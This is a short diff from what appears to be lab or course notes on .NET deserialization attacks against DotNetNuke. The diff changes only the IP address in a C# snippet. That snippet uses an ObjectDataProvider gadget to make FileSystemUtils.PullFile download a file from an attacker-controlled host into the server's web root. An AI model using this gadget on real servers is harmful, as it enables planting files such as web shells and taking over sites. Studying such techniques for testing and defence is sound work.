@@ -159,7 +159,7 @@ Its power lies in allowing attackers to set the `MethodName` property to invoke 
               ObjectDataProvider myODP = new ObjectDataProvider();
               myODP.ObjectInstance = new FileSystemUtils();
               myODP.MethodName = "PullFile";
-              myODP.MethodParameters.Add("http://192.168.119.120/myODPTest.txt");
+              myODP.MethodParameters.Add("http://192.168.45.192/myODPTest.txt");
               myODP.MethodParameters.Add("C:/inetpub/wwwroot/dotnetnuke/PullFileTest.txt");
               Console.WriteLine("Done!");
           }
